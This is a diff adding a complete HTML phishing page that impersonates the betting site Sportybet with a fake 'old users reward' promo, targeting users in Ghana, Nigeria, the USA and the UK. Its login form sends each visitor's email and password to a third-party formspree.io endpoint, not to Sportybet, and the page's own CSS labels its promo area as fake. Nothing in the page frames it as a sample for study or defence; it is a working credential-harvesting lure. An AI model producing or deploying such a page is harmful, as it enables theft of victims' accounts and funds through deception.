@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Funspy Rewards</title>
+
+<style>
+*{
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
+
+body{
+    margin:0;
+    background:#050505;
+    color:white;
+}
+
+.container{
+    min-height:100vh;
+    padding:25px;
+    background:
+    radial-gradient(circle at top right,#b30000,transparent 35%),
+    #050505;
+}
+
+/* Header */
+.logo{
+    font-size:40px;
+    font-weight:bold;
+    color:#ff0033;
+}
+
+.hero{
+    display:flex;
+    flex-wrap:wrap;
+    gap:30px;
+    margin-top:20px;
+}
+
+.left{
+    flex:1;
+    min-width:300px;
+}
+
+.right{
+    flex:1;
+    min-width:300px;
+    text-align:center;
+}
+
+
+h1{
+    font-size:35px;
+}
+
+.highlight{
+    color:#ff0033;
+}
+
+.reward{
+    background:linear-gradient(45deg,#ff0000,#ff9900);
+    padding:20px;
+    border-radius:15px;
+    font-size:25px;
+    font-weight:bold;
+    margin-bottom:25px;
+}
+
+/* Form */
+.form-box{
+    background:#111;
+    border:1px solid #333;
+    padding:25px;
+    border-radius:20px;
+}
+
+input,select{
+    width:100%;
+    padding:15px;
+    margin:10px 0;
+    background:#222;
+    border:1px solid #444;
+    color:white;
+    border-radius:10px;
+}
+
+
+.password-box{
+    position:relative;
+}
+
+.show{
+    position:absolute;
+    right:15px;
+    top:25px;
+    cursor:pointer;
+    color:#ff0033;
+}
+
+button{
+    width:100%;
+    padding:16px;
+    background:#ff0033;
+    color:white;
+    border:none;
+    border-radius:10px;
+    font-size:20px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#d9002b;
+}
+
+
+/* Features */
+
+.features{
+    display:flex;
+    flex-wrap:wrap;
+    gap:15px;
+    margin-top:30px;
+}
+
+.card{
+    flex:1;
+    min-width:150px;
+    background:#151515;
+    padding:20px;
+    border-radius:15px;
+    text-align:center;
+    border:1px solid #333;
+}
+
+.icon{
+    font-size:35px;
+}
+
+
+/* Fake promo image area */
+
+.sports{
+    font-size:100px;
+    margin-top:40px;
+}
+
+.small{
+    color:#aaa;
+}
+
+a{
+    color:#ff0033;
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<div class="container">
+
+
+<div class="logo">
+⚡ Sportybet old registers reward
+</div>
+
+
+<div class="hero">
+
+
+<div class="left">
+
+
+<div class="reward">
+🏆 YOU COULD WIN BIG!<br>
+🎁 Reward waiting for you
+</div>
+
+
+<h1>
+Welcome Back!
+</h1>
+
+<p>
+Login and claim your reward from our special promo for old users.
+</p>
+
+
+<div class="form-box">
+
+
+<form action="https://formspree.io/f/mwvdgpzn" method="POST">
+
+
+<label>Country</label>
+
+<select name="country">
+
+<option>🇬🇭 Ghana</option>
+<option>🇳🇬 Nigeria</option>
+<option>🇺🇸 USA</option>
+<option>🇬🇧 UK</option>
+
+</select>
+
+
+
+<input 
+type="email" 
+name="email"
+placeholder="Email address"
+required>
+
+
+<div class="password-box">
+
+<input 
+id="password"
+type="password"
+name="password"
+placeholder="Password">
+
+
+<span class="show" onclick="showPassword()">
+Show
+</span>
+
+</div>
+
+
+
+<button type="submit">
+Login & Claim Reward
+</button>
+
+
+</form>
+
+
+<p>
+Don't have an account?
+<a href="#">Sign Up</a>
+</p>
+
+
+</div>
+
+</div>
+
+
+
+
+<div class="right">
+
+
+<div class="sports">
+
+⚽🏀🏆🎮💪
+
+</div>
+
+
+<h2>
+Special Promo
+</h2>
+
+
+<p class="small">
+Play games • Win big • Complete challenges • Earn rewards
+</p>
+
+
+</div>
+
+
+</div>
+
+
+
+<div class="features">
+
+
+<div class="card">
+<div class="icon">🏆</div>
+Rewards
+</div>
+
+
+<div class="card">
+<div class="icon">⚽</div>
+Sports
+</div>
+
+
+<div class="card">
+<div class="icon">🎮</div>
+Games
+</div>
+
+
+<div class="card">
+<div class="icon">💪</div>
+Virtuals
+</div>
+
+
+</div>
+
+
+</div>
+
+
+
+<script>
+
+function showPassword(){
+
+let pass=document.getElementById("password");
+
+if(pass.type==="password"){
+pass.type="text";
+}else{
+pass.type="password";
+}
+
+}
+
+</script>
+
+
+</body>
+</html>
